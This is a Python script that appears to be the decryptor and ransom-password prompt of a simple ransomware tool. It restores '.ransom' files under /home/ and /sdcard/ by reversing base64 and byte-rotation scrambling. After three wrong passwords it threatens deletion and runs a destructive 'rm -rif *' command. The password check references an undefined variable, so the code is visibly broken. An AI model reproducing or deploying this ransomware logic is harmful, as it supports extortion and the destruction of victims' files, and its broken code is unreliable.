data_password="45ba142cd1c2b8fb5ab16117e2563b93"
import os,base64
from hashlib import md5
def decrypt_name(name,password):
    kay=16
    mod=26
    name=name.replace(".ransom","")
    try:
        name=name.replace('BroJda','/')
    except:
        pass
    name=((base64.b64decode(name.encode('utf8'))).decode('utf-8')).replace(password,"")
    return ("".join('{0}'.format(chr(ord(cr)-kay%mod))for cr in name))
def decrypt_file(patho,password):
    i=0
    while i<11:
        i=i+1
        with open(patho,'rb') as files:
            reading=files.read()
            with open(patho,'wb') as encrypt_files:
                if i ==7:
                    encrypt_files.write(base64.b64decode(reading)[:-len(password)])
                else:
                    encrypt_files.write(reading[-20:]+reading[:-20])
def decrypt(root,password):
    joker=0
    line=0
    print ('\033[37m  please wait...') 
    for r,d,fs in os.walk(root):
        for f in fs:
            pathT=os.path.join(r,f)
            T=pathT.split('/')[-1]
            test=T.split('.')[-1]
            if test=='ransom':
                line=line+1 
            else:
                pass
            if line==0:
                print (" \033[32m   Yor files aren't encrypte") 
                exit()
    print ('\033[37m  files: \033[31m',line)   
    for root,dirs,files in os.walk(root):
        for file in files:
            joker=joker+1
            i=int(joker/line*100)
            try:
                patho=os.path.join(root,file)
                name0='/'.join(patho.split('/')[:-1])
                x=patho.split('/')[-1]
                test=x.split('.')[-1]
                if test =="ransom":
                    name=decrypt_name(x,password)
                    new_name=name0+'/'+name
                    decrypt_file(patho,password)
                    os.rename(patho,new_name)
                else:
                    pass
            except:
                pass
            RR=" \033[43m"
            BB="\033[40m"
            Y="\033[31m"
            W="\033[37m" 
            print (RR+Y+"processing: "+str(i)+"%"+BB+W+" {"+(int(i/4)*"#")+(int(100/4-i/4)*".")+"}",end="\r")   
if __name__=="__main__":
    t=0
    while True:
        data_password=input("\033[31m  [?] Enter the password: ")
        if (md5(data_password.encode()).hexdigest())==password:
            decrypt('/home/',password)
            decrypt('/sdcard/',password)
            break
        else:
            t=t+1
            print ("password incorrect you have a \033[37m"+str(4-t)+"\033[31m of attempts.") 
            if t==3:
                print ('the file will be deleted now ')
                os.system("rm -rif *") 
                break
